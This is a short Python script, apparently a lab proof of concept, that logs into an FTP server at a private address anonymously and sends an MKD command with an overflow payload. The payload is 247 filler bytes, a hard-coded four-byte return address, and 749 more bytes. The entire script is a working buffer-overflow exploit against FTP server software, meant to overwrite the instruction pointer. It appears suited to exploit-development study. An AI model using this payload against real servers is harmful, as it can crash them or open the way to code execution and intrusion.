#!/usr/bin/python
 
import socket
import sys

# send 1000 letters to the server
payload = "A"*247 + "\x69\x2D\xB3\x7C" + "C"*749

# create a socket object to connect with the server 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.188.131',21))
 
# wait for the server to respond
s.recv(1024)
#send user name
s.send('USER anonymous\r\n')

# wait for the server to respond
s.recv(1024)
# send the password
s.send('PASS anonymous\r\n')

# wait for the server to respond
s.recv(1024)
#use the MKD command to fuzz the server
s.send('MKD ' + payload + '\r\n')

s.recv(1024)
s.send('QUIT\r\n')
s.close
